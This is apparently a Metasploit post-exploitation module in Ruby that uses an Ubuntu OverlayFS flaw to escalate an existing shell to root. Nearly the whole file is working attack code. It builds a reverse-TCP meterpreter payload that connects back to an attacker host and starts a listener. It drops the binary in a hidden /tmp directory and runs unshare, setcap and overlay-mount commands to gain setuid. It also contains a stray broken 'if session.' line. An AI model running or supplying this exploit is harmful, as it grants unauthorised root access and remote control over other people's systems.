##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  Rank = ExcellentRanking
  include Msf::Post::File
  include Msf::Post::Unix
  include Msf::Exploit::FileDropper

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Ubuntu Server GameOverlayFS Privsec',
        'Description' => %q{
          This module will level up shell to root with CVE
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'Esonhugh'
        ],
        'Platform' => ['linux'],
        'SessionTypes' => ['meterpreter', 'shell'],
        'Notes' => {
          'Stability' => [],
          'Reliability' => [],
          'SideEffects' => [IOC_IN_LOGS]
        }
      )
    )
    register_options(
      [
        OptAddressLocal.new('LHOST',
                            [false, 'IP of host that will receive the connection from the payload (Will try to auto detect).', nil]),
        OptInt.new('LPORT',
                   [true, 'Port for payload to connect to.', 4455]),
        OptBool.new('HANDLER',
                    [true, 'Start an exploit/multi/handler to receive the connection', true]),
        OptBool.new('PYTHON_WAY',
                    [false, "Using Python meterpreter "]
        )
      ], self.class
    )
    register_advanced_options [
                                OptString.new('WritableDir', [true, 'A directory where we can write files', '/tmp']),
                                OptInt.new('HANDLE_TIMEOUT',
                                           [true, 'How long to wait (in seconds) for the session to come back.', 200]),
                              ]
  end

  def base_dir
    datastore['WritableDir'].to_s
  end

  def run
    print_status("Upgrading session ID: #{datastore['SESSION']}")

    # Try hard to find a valid LHOST value in order to
    # make running 'sessions -u' as robust as possible.
    if datastore['LHOST']
      lhost = datastore['LHOST']
    elsif framework.datastore['LHOST']
      lhost = framework.datastore['LHOST']
    else
      lhost = session.tunnel_local.split(':')[0]
      if lhost == 'Local Pipe'
        print_error 'LHOST is "Local Pipe", please manually set the correct IP.'
        return
      end
    end

    # If nothing else works...
    lhost = Rex::Socket.source_address if lhost.blank?

    lport = datastore['LPORT']

    # Handle platform specific variables and settings
    # Find the best fit, be specific with uname to avoid matching hostname or something else
    target_info = cmd_exec('uname -ms')
    if target_info =~ /linux/i && (target_info =~ /amd64/ || target_info =~ /x86_64/)
      platform = 'linux'
      payload_name = 'linux/x64/meterpreter/reverse_tcp'
      lplat = [Msf::Platform::Linux]
      larch = [ARCH_X64]
      vprint_status('Platform: Linux amd64')
    elsif target_info =~ /linux/i && target_info =~ /86/
      # Handle linux shells that were identified as 'unix'
      platform = 'linux'
      payload_name = 'linux/x86/meterpreter/reverse_tcp'
      lplat = [Msf::Platform::Linux]
      larch = [ARCH_X86]
      vprint_status('Platform: Linux')
    elsif remote_python_binary
      # Generic fallback for OSX, Solaris, Linux/ARM
      platform = 'python'
      payload_name = 'python/meterpreter/reverse_tcp'
      vprint_status('Platform: Python [fallback]')
    end

    if datastore["PYTHON_WAY"]
      if remote_python_binary
        platform = 'python'
        payload_name = 'python/meterpreter/reverse_tcp'
        vprint_status('Platform: Python [fallback]')
      else
        print_error('Bad Usage in python way. Not found python binary on target')
        return nil
      end
    end

    if session.

      if platform.blank?
      print_error("Shells on the target platform, #{session.platform}, cannot be upgraded to Meterpreter at this time.")
      return nil
    end

    payload_name = datastore['PAYLOAD_OVERRIDE'] if datastore['PAYLOAD_OVERRIDE']

    vprint_status("Using payload: #{payload_name}")

    payload_data = generate_payload(lhost, lport, payload_name)
    if payload_data.blank?
      print_error("Unable to build a suitable payload for #{session.platform} using payload #{payload_name}.")
      return nil
    end
    vprint_status("generating payload #{lhost}:#{lport} #{payload_name}")

    if datastore['HANDLER']
      listener_job_id = create_multihandler(lhost, lport, payload_name)
      if listener_job_id.blank?
        print_error("Failed to start exploit/multi/handler on #{datastore['LPORT']}, it may be in use by another process.")
        return nil
      end
    end

    random_dir_name = ".#{rand_text_alphanumeric(5)}"
    executable_path = "#{base_dir}/#{random_dir_name}"
    vprint_status("Generate tmp dir #{executable_path}")
    cmd_exec("mkdir -p #{executable_path}")
    cd(executable_path)
    vprint_status("Change Dir to #{pwd}")

    case platform
    when 'linux'
      vprint_status('Transfer method: Bourne shell [fallback]')
      rb = "#{executable_path}/l/basher"
      exe = Msf::Util::EXE.to_executable(framework, larch, lplat, payload_data)
      vprint_status("mkdir with overlay fs")
      cmd_exec("mkdir u l w m")
      vprint_status("upload shellloader #{rb}")
      upload_and_chmodx(rb, exe)
      chmod(rb, perm = 0o755)
      vprint_status("exploiting ...")
      cmd_exec("unshare -rm sh -c \"setcap cap_setuid+eip l/basher;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w, m && touch m/*;\"")
      # aborted = transmit_payload(exe, platform)
      cmd_exec("u/basher")
    when 'python'
      vprint_status('Transfer method: Python')
      vprint_status("mkdir with overlay fs")
      cmd_exec("mkdir u l w m")
      vprint_status("upload shellloader #{rb}")
      cmd_exec("cp `which #{remote_python_binary}` l/bash")
      vprint_status("exploiting ...")
      cmd_exec("unshare -rm sh -c \"setcap cap_setuid+eip l/bash;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w, m && touch m/*;\"")
      cmd_exec("echo \"import os;os.setuid(0);#{payload_data}\" | u/bash" )
    else
      vprint_status("Bad method #{platform}")
    end

    if datastore['HANDLER']
      vprint_status('Cleaning up handler')
      cleanup_handler(listener_job_id)
    end
    # rm_rf(executable_path)

    nil

  end

  def rand_text_alphanumeric(length)
    Rex::Text.rand_text_alpha(length)
  end

  def cleanup_handler(listener_job_id)
    # Return if the job has already finished
    return nil if framework.jobs[listener_job_id].nil?
    framework.threads.spawn('GameoverlayfsMeterpreterUpgradeCleanup', false) do
      timer = 0
      timeout = datastore['HANDLE_TIMEOUT']
      vprint_status("Waiting up to #{timeout} seconds for the session to come back")
      while !framework.jobs[listener_job_id].nil? && timer < timeout
        sleep(1)
        timer += 1
      end
      print_status('Stopping exploit/multi/handler')
      framework.jobs.stop_job(listener_job_id)
    end
  end

  def remote_python_binary
    return @remote_python_binary if defined?(@remote_python_binary)

    python_exists_regex = /Python (2|3)\.(\d)/

    if cmd_exec('python3 -V 2>&1') =~ python_exists_regex
      @remote_python_binary = 'python3'
    elsif cmd_exec('python -V 2>&1') =~ python_exists_regex
      @remote_python_binary = 'python'
    elsif cmd_exec('python2 -V 2>&1') =~ python_exists_regex
      @remote_python_binary = 'python2'
    else
      @remote_python_binary = nil
    end

    @remote_python_binary
  end

  def generate_payload(lhost, lport, payload_name)
    payload = framework.payloads.create(payload_name)

    unless payload.respond_to?('generate_simple')
      print_error("Could not generate payload #{payload_name}. Invalid payload?")
      return
    end

    options = "LHOST=#{lhost} LPORT=#{lport} RHOST=#{rhost} PrependSetuid=true"
    payload.generate_simple('OptionStr' => options)
  end

  # Method for checking if a listener for a given IP and port is present
  # will return true if a conflict exists and false if none is found
  def check_for_listener(lhost, lport)
    client.framework.jobs.each do |_k, j|
      next unless j.name =~ %r{ multi/handler}

      current_id = j.jid
      current_lhost = j.ctx[0].datastore['LHOST']
      current_lport = j.ctx[0].datastore['LPORT']
      if lhost == current_lhost && lport == current_lport.to_i
        print_error("Job #{current_id} is listening on IP #{current_lhost} and port #{current_lport}")
        return true
      end
    end
    return false
  end

  # Starts a exploit/multi/handler session
  def create_multihandler(lhost, lport, payload_name)
    pay = client.framework.payloads.create(payload_name)
    pay.datastore['RHOST'] = rhost
    pay.datastore['LHOST'] = lhost
    pay.datastore['LPORT'] = lport
    pay.datastore['PrependSetuid'] = true

    print_status('Starting exploit/multi/handler')

    if check_for_listener(lhost, lport)
      print_error('A job is listening on the same local port')
      return
    end

    # Set options for module
    mh = client.framework.exploits.create('multi/handler')
    mh.share_datastore(pay.datastore)
    mh.datastore['WORKSPACE'] = client.workspace
    mh.datastore['PAYLOAD'] = payload_name
    mh.datastore['EXITFUNC'] = 'thread'
    mh.datastore['ExitOnSession'] = true
    # Validate module options
    mh.options.validate(mh.datastore)
    # Execute showing output
    mh.exploit_simple(
      'Payload' => mh.datastore['PAYLOAD'],
      'LocalInput' => user_input,
      'LocalOutput' => user_output,
      'RunAsJob' => true
    )

    # Check to make sure that the handler is actually valid
    # If another process has the port open, then the handler will fail
    # but it takes a few seconds to do so.  The module needs to give
    # the handler time to fail or the resulting connections from the
    # target could end up on on a different handler with the wrong payload
    # or dropped entirely.
    select(nil, nil, nil, 5)
    return nil if framework.jobs[mh.job_id.to_s].nil?

    mh.job_id.to_s
  end
end
